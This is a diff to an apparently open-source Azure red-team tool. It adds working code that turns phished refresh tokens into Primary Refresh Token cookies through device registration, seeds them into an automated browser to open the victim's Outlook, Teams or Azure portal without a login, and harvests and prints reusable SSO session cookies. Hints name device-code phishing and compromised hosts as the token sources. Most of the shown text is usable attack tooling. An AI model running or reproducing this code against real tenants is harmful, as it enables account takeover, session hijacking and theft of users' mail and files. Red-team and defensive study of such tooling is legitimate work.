@@ -8,11 +8,13 @@
 # (AzureRedOps) $ python3 AzureRedOps.py
 # (AzureRedOps) $ pip install -r requirements.txt
 
+
 import os
 import re
 import jwt
 import time
 import json
+import base64
 import urllib
 import argparse
 import requests
@@ -35,6 +37,32 @@ class AzureRedOps:
     DEFAULT_SCOPE = "openid offline_access"
     DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
     DEFAULT_ENDPOINT = "microsoftonline.com"
+    # Playwright engine used by the browser flows. Firefox is the default: it is
+    # the most reliable headed engine under WSLg. Override with -br/--browser.
+    DEFAULT_BROWSER = "firefox"
+    SUPPORTED_BROWSERS = ["firefox", "chromium", "webkit"]
+    # Microsoft Office - a FOCI (Family of Client IDs) client, so its refresh
+    # tokens can be redeemed for sibling first-party resources (Outlook, Teams...).
+    DEFAULT_FOCI_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+    # Friendly web-app targets for the browser SSO flow -> (token resource, web URL).
+    WEB_APP_TARGETS = {
+        "outlook":    {"resource": "https://outlook.office365.com",     "url": "https://outlook.office.com/mail/"},
+        "office":     {"resource": "https://www.office.com",            "url": "https://www.office.com/"},
+        "teams":      {"resource": "https://api.spaces.skype.com",      "url": "https://teams.microsoft.com/"},
+        "sharepoint": {"resource": "https://microsoft.sharepoint.com",  "url": "https://www.office.com/launch/sharepoint"},
+        "onedrive":   {"resource": "https://microsoft-my.sharepoint.com","url": "https://www.office.com/launch/onedrive"},
+        "portal":     {"resource": "https://management.core.windows.net","url": "https://portal.azure.com/"},
+        "graph":      {"resource": "https://graph.microsoft.com",       "url": "https://developer.microsoft.com/en-us/graph/graph-explorer"},
+    }
+    # Cookies worth harvesting from a completed browser SSO session. The PRT
+    # cookie (x-ms-RefreshTokenCredential) can be replayed later with -prt; the
+    # ESTS* cookies are the authenticated ESTS session and can be reused as-is.
+    SSO_COOKIES = ["x-ms-RefreshTokenCredential", "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie"]
+    # First-party Office landing client used to warm up an ESTS session from the
+    # PRT cookie in a top-level (first-party) context before opening the target
+    # app. Matches the authorize flow seen in the wild (office.com/landingv2).
+    SSO_WARMUP_CLIENT = "4765445b-32c6-49b0-83e6-1d93765276ca"
+    SSO_WARMUP_REDIRECT = "https://www.office.com/landingv2"
 
     def __init__(self):
         self.filters = []
@@ -51,6 +79,7 @@ class AzureRedOps:
         self.builtin_print = None
         self.additional_headers = {}
         self.microsoft_endpoint = self.DEFAULT_ENDPOINT
+        self.browser = self.DEFAULT_BROWSER
 
     def redirect_to_file(self):
         if self.builtin_print is None:
@@ -392,6 +421,73 @@ class AzureRedOps:
             print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
             self.save_credentials(response["access_token"], response["refresh_token"])
 
+    def is_wsl(self):
+        """Detect WSL/WSLg so we can harden the headed browser launch.
+
+        A headed browser on WSL is the source of the 'empty window that freezes
+        the whole machine' symptom: WSLg exposes a virtualized GPU (/dev/dxg via
+        the d3d12 Mesa driver) that the browser's GPU/compositor process tries to
+        use, and the default /dev/shm inside the WSL VM is tiny. The two combine
+        to spin the GPU process while nothing ever paints, ballooning the VM
+        until the Windows host thrashes. Disabling the GPU and the /dev/shm
+        transport avoids it entirely (see launch_browser)."""
+        if os.environ.get("WSL_DISTRO_NAME") or os.environ.get("WSL_INTEROP"):
+            return True
+        try:
+            with open("/proc/version", "r") as f:
+                return "microsoft" in f.read().lower()
+        except Exception:
+            return False
+
+    def launch_browser(self, p):
+        """Launch a headed browser (engine chosen by -br/--browser, default
+        Firefox) hardened for the current environment.
+
+        Firefox is the default because it is the most reliable headed engine
+        under WSLg. Whatever the engine, on WSL we disable hardware acceleration
+        so the window paints on the virtualized GPU instead of hanging blank and
+        wedging the host. Rendering falls back to CPU (software) rasterization,
+        so the login page stays fully visible and interactive."""
+        wsl = self.is_wsl()
+        engine = (self.browser or self.DEFAULT_BROWSER).lower()
+        if engine not in self.SUPPORTED_BROWSERS:
+            print(f"{self.w("Hint")}Unknown browser '{engine}'. Falling back to '{self.DEFAULT_BROWSER}' (choices: {', '.join(self.SUPPORTED_BROWSERS)}).")
+            engine = self.DEFAULT_BROWSER
+        if wsl:
+            print(f"{self.w("Action")}WSL detected: disabling GPU/hardware acceleration on {engine} to avoid the blank-window freeze.")
+        print(f"{self.w("Action")}Launching {engine} (Playwright).")
+
+        if engine == "chromium":
+            args = ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"] if wsl else []
+            return p.chromium.launch(headless=False, args=args)
+        if engine == "webkit":
+            return p.webkit.launch(headless=False)
+        # Firefox (default). Force software rendering under WSL; WSLg's virtual
+        # GPU hangs Firefox's WebRender compositor otherwise.
+        prefs = {"gfx.webrender.force-disabled": True, "layers.acceleration.disabled": True} if wsl else {}
+        return p.firefox.launch(headless=False, firefox_user_prefs=prefs)
+
+    def dump_sso_cookies(self, cookies):
+        """Print any PRT / ESTS session cookie present in a browser cookie list
+        so an issued PRT (or the ESTS session) can be reused afterward.
+
+        `cookies` is the list returned by context.cookies(). We print the PRT
+        cookie value with a ready-to-paste -prt hint so the next run can seed it
+        for automatic SSO, and echo the ESTS* session cookies for reuse."""
+        found = [c for c in (cookies or []) if c.get("name") in self.SSO_COOKIES]
+        if not found:
+            print(f"{self.w("Hint")}No PRT/ESTS session cookie was present in this session (nothing to reuse).")
+            return
+        print(f"{self.w("Action")}Harvested {len(found)} reusable SSO cookie(s) from the browser session:")
+        for c in found:
+            name = c.get("name")
+            value = c.get("value")
+            if name == "x-ms-RefreshTokenCredential":
+                print(f"{self.w("PRT Cookie")}{value}")
+                print(f"{self.w("Reuse")}Replay this PRT for automatic SSO with:  -prt \"{value}\"")
+            else:
+                print(f"{self.w(name)}{value}")
+
     def auth_interactive(self, url, keep = False):
         delay = 75
         session_file_path = "session.har"
@@ -401,17 +497,27 @@ class AzureRedOps:
 
         try:
             with sync_playwright() as p:
-                browser = p.chromium.launch(headless=False)
+                browser = self.launch_browser(p)
                 context = browser.new_context(record_har_path=session_file_path)
                 page = context.new_page()
 
-                page.goto(f"https://login.{self.microsoft_endpoint}", wait_until="networkidle")
+                # The Microsoft login page long-polls (telemetry/websockets) so
+                # 'networkidle' never fires and page.goto blocks on a blank window
+                # until it times out. Wait for the DOM instead.
+                page.goto(f"https://login.{self.microsoft_endpoint}", wait_until="domcontentloaded")
                 time.sleep(delay)
 
                 for u in url.split(","):
                     print(f"{self.w("Action")}Waited for {delay} seconds. Redirecting to {u}.")
-                    page.goto(u, wait_until="networkidle")
+                    page.goto(u, wait_until="domcontentloaded")
                     time.sleep(10)
+
+                # Surface any PRT/ESTS session cookie issued during the login so
+                # it can be reused (seed with -prt) before we tear down the context.
+                try:
+                    self.dump_sso_cookies(context.cookies())
+                except Exception as e:
+                    print(f"{self.w("Error")}Could not read browser cookies: {str(e)}")
 
                 context.close()
                 browser.close()
@@ -485,6 +591,332 @@ class AzureRedOps:
                 self.save_credentials(response["access_token"], response["refresh_token"])
             else:
                 return response
+
+    def obo(self, assertion, tenant, appid, secret, scope=None):
+        """OAuth 2.0 On-Behalf-Of (jwt-bearer) grant.
+
+        Exchange an already-issued access token (the 'assertion') for a brand new
+        token scoped to a downstream resource. The confidential client identified
+        by appid/secret must be the audience ('aud') of the assertion token,
+        otherwise Entra ID rejects the exchange (AADSTS500131 / AADSTS50013).
+        """
+        if tenant is None:
+            tenant = "common"
+        if scope is None:
+            scope = f"{self.default_audience}/.default"
+
+        print(f"{self.w("Action")}Requesting On-Behalf-Of token for scope '{scope}'.")
+        data = {
+            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+            "client_id": appid,
+            "assertion": assertion,
+            "scope": scope,
+            "requested_token_use": "on_behalf_of",
+        }
+        if secret:
+            data["client_secret"] = secret
+        else:
+            print(f"{self.w("Hint")}No client secret supplied (-cs). OBO normally requires a confidential client.")
+
+        data = urllib.parse.urlencode(data)
+        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
+        if "error" in response:
+            print(f"{self.w("Error")}{response["error"]}")
+            print(f"{self.w("Description")}{response["error_description"]}")
+        else:
+            print(f"{self.w("Access Token")}{response["access_token"]}")
+            if "refresh_token" in response:
+                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
+            if "scope" in response:
+                print(f"{self.w("Scope")}{response["scope"]}")
+            self.save_credentials(response["access_token"], response.get("refresh_token"))
+
+    def resolve_web_target(self, target):
+        """Map a friendly target name (outlook, teams, ...) or a raw URL list to a
+        (resource, [urls]) tuple used by the browser SSO flow."""
+        if target is None:
+            target = "outlook"
+        preset = self.WEB_APP_TARGETS.get(target.lower())
+        if preset:
+            return preset["resource"], [preset["url"]]
+        # Not a preset: treat as one or more raw URLs. The resource falls back to
+        # the current audience so the minted token still matches a usable target.
+        return self.default_audience, [u.strip() for u in target.split(",") if u.strip()]
+
+    def mint_prt(self, refresh_token, tenant, appid=None):
+        """Mint a PRT + session key from a refresh token (device registration ->
+        PRT). Stops short of the cookie so the caller can derive it with a fresh
+        nonce right before the browser navigates.
+
+        `appid` is the client the refresh token was issued to (the -app used to
+        phish it); the chain redeems the RT with its own client, which is what
+        actually works. Returns (PRTManager, prt, session_key_bytes) or
+        (None, None, None) on failure."""
+        from includes.PRT import PRTManager, PRTError
+        try:
+            mgr = PRTManager(
+                endpoint=self.microsoft_endpoint,
+                user_agent=self.user_agent,
+                rt_client_id=appid,
+                log=lambda msg: print(f"{self.w("Action")}{msg}"),
+            )
+            result = mgr.mint_prt(refresh_token, tenant)
+        except PRTError as e:
+            print(f"{self.w("Error")}Auto-PRT failed: {str(e)}")
+            return None, None, None
+        except Exception as e:
+            print(f"{self.w("Error")}Auto-PRT failed unexpectedly: {str(e)}")
+            return None, None, None
+
+        print(f"{self.w("PRT")}{result["prt"]}")
+        print(f"{self.w("Session Key")}{base64.b64encode(result["session_key"]).decode()}")
+        if result.get("device_id"):
+            print(f"{self.w("Device ID")}{result["device_id"]}")
+        return mgr, result["prt"], result["session_key"]
+
+    def _derive_and_show_cookie(self, mgr, prt, session_key, quiet=False):
+        """Derive a fresh PRT cookie (fresh nonce) and print it for reuse."""
+        try:
+            cookie = mgr.derive_cookie(prt, session_key)
+        except Exception as e:
+            print(f"{self.w("Error")}Could not derive the PRT cookie: {str(e)}")
+            return None
+        if not quiet:
+            print(f"{self.w("PRT Cookie")}{cookie}")
+            print(f"{self.w("Reuse")}Replay this PRT cookie directly with:  -prt \"{cookie}\"")
+        return cookie
+
+    def _seed_prt_cookie(self, context, cookie):
+        """Seed (or overwrite) the x-ms-RefreshTokenCredential cookie.
+
+        sameSite=None is essential: the Office/Outlook SPA does its silent
+        sign-in via a hidden iframe to login.microsoftonline.com (a third-party
+        context) where a Lax/unset cookie is not sent."""
+        context.add_cookies([{
+            "name": "x-ms-RefreshTokenCredential",
+            "value": cookie,
+            "domain": f"login.{self.microsoft_endpoint}",
+            "path": "/",
+            "httpOnly": True,
+            "secure": True,
+            "sameSite": "None",
+        }])
+        # Browsers silently drop cookies over ~4 KB; confirm it actually landed so
+        # a dropped cookie doesn't masquerade as an ESTS rejection.
+        try:
+            stored = [c for c in context.cookies(f"https://login.{self.microsoft_endpoint}/")
+                      if c.get("name") == "x-ms-RefreshTokenCredential"]
+            if not stored:
+                print(f"{self.w("Error")}PRT cookie ({len(cookie)} bytes) was NOT stored -- likely over the browser's ~4 KB cookie limit; ESTS will never receive it.")
+        except Exception:
+            pass
+
+    def _extract_ests_error(self, page):
+        """Pull an AADSTS error out of the ESTS login page so the operator sees
+        *why* SSO failed (stale nonce vs MFA vs compliant-device CA)."""
+        try:
+            html = page.content()
+        except Exception:
+            return None
+        m = re.search(r"AADSTS\d+[^\"<\\]*", html)
+        if m:
+            return m.group(0).strip()
+        m = re.search(r'"sErrorCode":"([^"]+)"', html)
+        if m:
+            return f"ESTS error code {m.group(1)}"
+        return None
+
+    def _authorize_url(self, tenant, prompt_none=False):
+        url = (f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/authorize"
+               f"?client_id={self.SSO_WARMUP_CLIENT}"
+               f"&response_type=code"
+               f"&redirect_uri={urllib.parse.quote(self.SSO_WARMUP_REDIRECT, safe='')}"
+               f"&scope=openid+profile+offline_access"
+               f"&response_mode=query")
+        if prompt_none:
+            url += "&prompt=none"
+        return url
+
+    def _warmup_sso(self, page, tenant):
+        """Consume the PRT cookie via a top-level ESTS /authorize navigation so
+        ESTSAUTH is minted first-party. Returns (success, landed_url, error)."""
+        try:
+            page.goto(self._authorize_url(tenant), wait_until="domcontentloaded")
+            time.sleep(6)
+            landed = page.url
+            if f"login.{self.microsoft_endpoint}" not in landed:
+                return True, landed, None
+            return False, landed, self._extract_ests_error(page)
+        except Exception as e:
+            return False, None, str(e)
+
+    def _diagnose_sso(self, page, tenant):
+        """Probe /authorize with prompt=none so ESTS returns an explicit AADSTS
+        reason (silent-auth failed / MFA / device compliance) instead of a bare
+        login form -- turns 'still on login page' into an actionable cause."""
+        try:
+            page.goto(self._authorize_url(tenant, prompt_none=True), wait_until="domcontentloaded")
+            time.sleep(3)
+            if f"login.{self.microsoft_endpoint}" not in page.url:
+                return "SSO actually succeeded under prompt=none."
+            return self._extract_ests_error(page)
+        except Exception as e:
+            return str(e)
+
+    def browser_sso(self, refresh_token, tenant, appid, target, prt_cookie=None, version="v2.0", keep=False, auto_prt=False):
+        """Open a browser that is already authenticated as the user (SSO).
+
+        The goal is "open the browser and land straight in the web app" -- no
+        manual login. There are three ways the browser gets its session, in order
+        of preference:
+
+        1. -aprt/--auto-prt: mint a PRT cookie from the refresh token on the fly
+           (device registration -> PRT -> x-ms-RefreshTokenCredential) and seed
+           it. This is the streamlined flow: no token exchange first, the browser
+           opens seeded and ESTS completes SSO automatically.
+        2. -prt/--prt-cookie: seed a PRT cookie you already have (e.g. from a
+           previous -aprt run or a compromised host).
+        3. Neither: fall back to converting the refresh token to a resource-scoped
+           API token (printed + saved) and open the target for a manual login.
+
+        Whatever the path, any PRT/ESTS session cookie issued in the browser is
+        harvested and printed at the end for reuse.
+        """
+        if tenant is None:
+            tenant = "common"
+        resource, urls = self.resolve_web_target(target)
+        delay = 600
+        session_file_path = "session.har"
+
+        # Path 1: auto-mint a PRT so a fresh browser lands authenticated. We only
+        # do device-reg + PRT here; the cookie is derived later (fresh nonce)
+        # right before the browser navigates.
+        mgr = prt = session_key = None
+        if auto_prt and not prt_cookie:
+            print(f"{self.w("Action")}Auto-PRT: minting a PRT from the refresh token.")
+            mgr, prt, session_key = self.mint_prt(refresh_token, tenant, appid)
+            if not mgr:
+                print(f"{self.w("Hint")}Auto-PRT failed; opening the browser without a seeded PRT cookie -- you may need to log in manually.")
+
+        # Path 3: no PRT cookie -> convert the refresh token to a resource-scoped
+        # API token (printed + saved) so the run is still useful. Skipped when
+        # -aprt was attempted: that chain already consumes/rotates the refresh
+        # token, so replaying the original here would just fail with AADSTS70000.
+        if not prt_cookie and not auto_prt:
+            print(f"{self.w("Action")}Converting the refresh token to a '{resource}' scoped token.")
+            if version == "v2.0":
+                data = { "client_id": appid, "grant_type": "refresh_token", "refresh_token": refresh_token, "scope": f"{resource}/.default offline_access openid" }
+                response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
+            else:
+                data = { "client_id": appid, "grant_type": "refresh_token", "refresh_token": refresh_token, "resource": resource }
+                data = urllib.parse.urlencode(data)
+                response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)
+
+            if "error" in response:
+                print(f"{self.w("Error")}{response["error"]}")
+                print(f"{self.w("Description")}{response["error_description"]}")
+            else:
+                print(f"{self.w("Access Token")}{response["access_token"]}")
+                if "refresh_token" in response:
+                    print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
+                self.save_credentials(response["access_token"], response.get("refresh_token"))
+
+        can_seed = bool(prt_cookie) or (mgr is not None)
+        print(f"{self.w("Action")}Spawning a browser to open {', '.join(urls)}.")
+        if not can_seed:
+            print(f"{self.w("Hint")}No PRT cookie: pass -aprt to auto-mint one, or -prt to seed one. The browser will open the target but you must complete the login. Any API tokens above are saved.")
+
+        try:
+            with sync_playwright() as p:
+                browser = self.launch_browser(p)
+                context = browser.new_context(record_har_path=session_file_path, user_agent=self.user_agent)
+                page = context.new_page()
+
+                if can_seed:
+                    # Derive the cookie now (fresh nonce) if we minted a PRT, then
+                    # consume it via a top-level ESTS /authorize navigation so
+                    # ESTSAUTH is minted first-party. Retry once with a new nonce
+                    # if ESTS stays on the login page (a stale request_nonce is the
+                    # most common transient cause).
+                    if mgr is not None and not prt_cookie:
+                        prt_cookie = self._derive_and_show_cookie(mgr, prt, session_key)
+
+                    ok = False
+                    max_attempts = 2 if mgr is not None else 1
+                    for attempt in range(1, max_attempts + 1):
+                        if attempt > 1 and mgr is not None:
+                            print(f"{self.w("Action")}SSO not completed; retrying with a fresh nonce (attempt {attempt}).")
+                            prt_cookie = self._derive_and_show_cookie(mgr, prt, session_key, quiet=True)
+                        if not prt_cookie:
+                            break
+                        self._seed_prt_cookie(context, prt_cookie)
+                        print(f"{self.w("Action")}Establishing an ESTS session from the PRT cookie.")
+                        ok, landed, err = self._warmup_sso(page, tenant)
+                        if ok:
+                            print(f"{self.w("Action")}ESTS session established (landed on {landed}).")
+                            break
+                        if err:
+                            print(f"{self.w("Error")}ESTS rejected the PRT cookie: {err}")
+                        elif landed:
+                            print(f"{self.w("Hint")}Still on the ESTS login page ({landed}).")
+                    if not ok:
+                        reason = self._diagnose_sso(page, tenant)
+                        if reason:
+                            print(f"{self.w("Reason")}{reason}")
+                        print(f"{self.w("Hint")}Automatic SSO did not complete. Likely Conditional Access requiring a compliant/managed device, or MFA required for this app/user -- neither is bypassable with a freshly registered device. Finish the login manually in the open browser if you can.")
+
+                for u in urls:
+                    print(f"{self.w("Action")}Navigating to {u}.")
+                    try:
+                        # OWA/Teams long-poll, so 'networkidle' never fires; wait for the DOM instead.
+                        page.goto(u, wait_until="domcontentloaded")
+                    except Exception as e:
+                        print(f"{self.w("Error")}Could not open {u}: {str(e)}")
+                        break
+                    time.sleep(5)
+                print(f"{self.w("Action")}Browser is live as the user. Close the window when done (auto-closes after {delay}s).")
+                # Poll the context for PRT/ESTS cookies while the session is live so
+                # the latest issued PRT is captured even if the operator closes the
+                # window before the timeout (cookies are unreadable once torn down).
+                #
+                # Resume as soon as the operator closes the window. We can't rely on
+                # browser.is_connected() alone: with a headed browser (notably
+                # Firefox) closing the window closes the *page* but leaves the
+                # browser process connected, so is_connected() stays True. Reading
+                # cookies round-trips and flushes the page 'close' event, after
+                # which context.pages is empty -> we break instead of hanging out
+                # the full timeout.
+                sso_cookies = []
+                waited = 0
+                while browser.is_connected() and waited < delay:
+                    try:
+                        snapshot = [c for c in context.cookies() if c.get("name") in self.SSO_COOKIES]
+                        if snapshot:
+                            sso_cookies = snapshot
+                    except Exception:
+                        break  # context/browser torn down
+                    if not context.pages:
+                        break  # operator closed the window(s)
+                    time.sleep(3)
+                    waited += 3
+                if browser.is_connected():
+                    try:
+                        context.close()
+                        browser.close()
+                    except Exception:
+                        pass
+                # Surface the issued PRT/ESTS cookies so they can be reused later.
+                self.dump_sso_cookies(sso_cookies)
+        except Exception as e:
+            print(f"{self.w("Error")}{str(e)}")
+
+        try:
+            if not keep:
+                os.unlink(session_file_path)
+            else:
+                print(f"{self.w("Action")}{session_file_path} file was preserved.")
+        except:
+            pass
 
     def graph_spray(self, username, password, tenant, filepath = "includes/auth_apps.json"):
         apps = None
@@ -809,9 +1241,10 @@ class AzureRedOps:
                                     for client in client_url.get("redirectUris"):
                                         print(f"{self.w("Success")}Url Redirection set to {client}.")
 
+
 def main():
     parser = argparse.ArgumentParser(description=f"Azure RedOps v{VERSION} - A Swiss Army tool for Azure red teaming.")
-    parser.add_argument("-a", "--activity", required=True, default="id", help="save, list-token, view, delete, id, phish-start, phish-capture, auth, auth-app, auth-interactive, refresh, self, email, list-users, list-applications, list-principals, register-app, add-group, new-group, push-file, permission, spray, spray-refresh, spray-custom, gather-all, raw-url, invite, magic-app, list-interest, interest, knownids")
+    parser.add_argument("-a", "--activity", required=True, default="id", help="save, list-token, view, delete, id, phish-start, phish-capture, auth, auth-app, auth-interactive, refresh, obo, browser-sso, self, email, list-users, list-applications, list-principals, register-app, add-group, new-group, push-file, permission, spray, spray-refresh, gather-all, raw-url, invite, magic-app, list-interest, interest, knownids")
     parser.add_argument("-ac", "--access-token", required=False, help="Azure access token")
     parser.add_argument("-n", "--name", required=False, help="Azure access token name")
     parser.add_argument("-t", "--tenant", required=False, help="Azure tenant domain name")
@@ -845,6 +1278,10 @@ def main():
     parser.add_argument("-exp", "--expand", required=False, action="store_true", default=False, help="Format output list and dict by expanding them to human readable format")
     parser.add_argument("-pe", "--permissions", required=False, help="Comma separated list of permission GUID")
     parser.add_argument("-k", "--keep", required=False, action="store_true", default=False, help="Keep session.har file")
+    parser.add_argument("-cs", "--client-secret", required=False, help="Confidential client secret used by the 'obo' On-Behalf-Of grant")
+    parser.add_argument("-prt", "--prt-cookie", required=False, help="PRT cookie value (x-ms-RefreshTokenCredential) to seed browser SSO for 'browser-sso'")
+    parser.add_argument("-br", "--browser", required=False, default="firefox", choices=["firefox", "chromium", "webkit"], help="Playwright browser engine for the browser flows (auth-interactive, browser-sso). Default: firefox")
+    parser.add_argument("-aprt", "--auto-prt", required=False, action="store_true", default=False, help="For 'browser-sso': auto-mint a PRT cookie from the refresh token (device registration -> PRT -> x-ms-RefreshTokenCredential) so the browser opens already authenticated. Requires the 'cryptography' package and a FOCI/broker refresh token.")
     parser.add_argument("-d", "--debug", required=False, action="store_true", default=False, help="Show debugging information")
     parser.add_argument("-dd", "--verbose-debug", required=False, action="store_true", default=False, help="Show http request debugging  information")
     parser.add_argument("-re", "--redirect-to-file", required=False, action="store_true", default=False, help="Redirect all prints to file")
@@ -854,6 +1291,8 @@ def main():
 
     app.microsoft_endpoint = args.endpoint
     print(f"{app.w("Action")}Microsoft domain set to '{app.microsoft_endpoint}'.")
+
+    app.browser = args.browser
 
     if args.redirect_to_file:
         print(f"{app.w("Action")}Output will be redirected to a output.txt.")
@@ -980,6 +1419,38 @@ def main():
 
         appid = app.is_args_set(args, "appid")
         app.refresh(refresh_token, tenant, appid, version=version)
+
+    elif args.activity == "obo":
+        app.print_hint(["OBO requires a confidential client whose 'aud' matches the assertion token. Set the target resource with -au/--audience (default https://graph.microsoft.com) or a full scope with -sc/--scope, and the secret with -cs/--client-secret."])
+        assertion = app.is_args_set(args, "load_access_token", False)
+        if not assertion == None:
+            assertion = app.get_azure_token_from_file(assertion, "access_token")
+        else:
+            assertion = app.is_args_set(args, "access_token")
+        tenant = app.is_args_set(args, "tenant_id")
+        appid = app.is_args_set(args, "appid")
+        secret = app.is_args_set(args, "client_secret", False)
+        scope = app.default_scope if args.scope else None
+        app.obo(assertion, tenant, appid, secret, scope)
+
+    elif args.activity == "browser-sso":
+        app.print_hint(["Pick a target with -url: outlook, office, teams, sharepoint, onedrive, portal, graph, or a raw https URL (comma-separated for several). Defaults to outlook.",
+                        "For a hands-free authenticated browser, add -aprt/--auto-prt to auto-mint a PRT cookie from the refresh token (needs the 'cryptography' package and a FOCI/broker refresh token, e.g. from device-code phishing the Microsoft Authentication Broker).",
+                        "Or seed a PRT cookie you already have with -prt/--prt-cookie (the x-ms-RefreshTokenCredential value)."])
+        version = app.is_args_set(args, "version")
+        name = app.is_args_set(args, "load_access_token", False)
+        if not name == None:
+            refresh_token = app.get_azure_token_from_file(name, "refresh_token")
+            tenant = app.get_azure_token_from_file(name, "tenant")
+        else:
+            refresh_token = app.is_args_set(args, "refresh_token")
+            tenant = app.is_args_set(args, "tenant_id")
+        appid = app.is_args_set(args, "appid")
+        target = app.is_args_set(args, "url", False)
+        prt = app.is_args_set(args, "prt_cookie", False)
+        keep = args.keep
+        auto_prt = args.auto_prt
+        app.browser_sso(refresh_token, tenant, appid, target, prt, version, keep, auto_prt)
 
     elif args.activity == "self":
         token = app.is_args_set(args, "load_access_token", False)
@@ -1159,6 +1630,7 @@ def main():
 
     else:
         print(f"{app.w("Error")}Invalid activity provided.")
+
 
 if __name__ == "__main__":
     main()
